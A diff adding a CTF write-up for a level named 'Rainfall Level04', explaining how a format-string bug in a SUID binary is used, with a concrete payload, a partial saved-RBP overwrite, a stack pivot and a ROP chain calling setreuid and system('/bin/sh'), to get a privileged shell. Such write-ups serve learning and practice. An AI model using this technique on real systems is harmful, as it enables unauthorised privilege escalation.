@@ -1,0 +1,189 @@
+# Rainfall Level04 — `riviera`
+
+## Binary
+
+```text
+level04@rainfall:~$ ls -al riviera
+-rwsr-x--- 1 flag04 level04 16584 Jun  9 23:13 riviera
+```
+
+The binary is a 64-bit SUID executable running as `flag04`.
+
+The main vulnerability is in:
+
+```c
+static void display_entry(unsigned int idx)
+{
+    ...
+    printf(log_buf[idx].tag);
+    ...
+}
+```
+
+`tag` is completely controlled by the user, so this is a **format-string vulnerability**.
+
+---
+
+## Format-string exploit
+
+The exploit uses:
+
+```python
+payload = b"%10$57648x"
+payload += b"%10$hn\n"
+```
+
+`%10$hn` writes a 16-bit value to the address contained in the 10th argument.
+
+The value written is determined by the number of characters printed before `%hn`:
+
+```text
+57648 decimal = 0xe130
+```
+
+The 10th argument is controlled through the stack by placing:
+
+```python
+p64(handle_in_rbp_addr)
+```
+
+in the message.
+
+Therefore, the exploit performs approximately:
+
+```text
+*(uint16_t *)0x7fffffffe120 = 0xe130
+```
+
+The original saved `RBP` is:
+
+```text
+0x7fffffffe120
+```
+
+After the partial overwrite it becomes:
+
+```text
+0x7fffffffe130
+```
+
+Only the lower 16 bits need to change because the upper part of the stack address is already correct.
+
+---
+
+## Stack pivot
+
+The important addresses are:
+
+```python
+handle_in_rbp_addr = 0x7fffffffe120
+buffer_stack_start = 0x7fffffffe130
+```
+
+The controlled message starts at:
+
+```text
+0x7fffffffe130
+```
+
+so the saved `RBP` is redirected into attacker-controlled memory.
+
+When `handle_input()` returns, its `leave; ret` loads our value into `RBP`.
+
+Then `main()` reaches its own epilogue:
+
+```asm
+leave
+ret
+```
+
+Since:
+
+```text
+RBP = 0x7fffffffe130
+```
+
+`leave` effectively performs:
+
+```asm
+mov rsp, rbp
+```
+
+giving us:
+
+```text
+RSP = 0x7fffffffe130
+```
+
+This is the **stack pivot**.
+
+The controlled stack now looks like:
+
+```text
+0x7fffffffe130
++--------------------+
+| fake RBP           |
++--------------------+
+| ROP gadget         |
++--------------------+
+| ROP gadget         |
++--------------------+
+| ...                |
++--------------------+
+```
+
+`ret` then starts executing our ROP chain.
+
+---
+
+## ROP chain
+
+The exploit builds:
+
+```python
+rop.setreuid(1021, 1021)
+rop.raw(rop.ret)
+rop.system(next(libc.search(b"/bin/sh")))
+```
+
+The idea is:
+
+```text
+setreuid(1021, 1021)
+        ↓
+      ret
+        ↓
+system("/bin/sh")
+```
+
+`setreuid()` makes both the real and effective UID `flag04`, and the extra `ret` provides stack alignment before calling `system()`.
+
+---
+
+## Complete exploitation chain
+
+```text
+Format string
+     ↓
+%10$hn
+     ↓
+overwrite saved RBP
+     ↓
+RBP → attacker-controlled buffer
+     ↓
+main's leave; ret
+     ↓
+RSP → attacker-controlled buffer
+     ↓
+ROP chain
+     ↓
+setreuid(1021,1021)
+     ↓
+system("/bin/sh")
+     ↓
+flag04 shell
+```
+
+The key technique in this challenge is therefore:
+
+**format string → partial saved-RBP overwrite → stack pivot → ROP → SUID shell**.
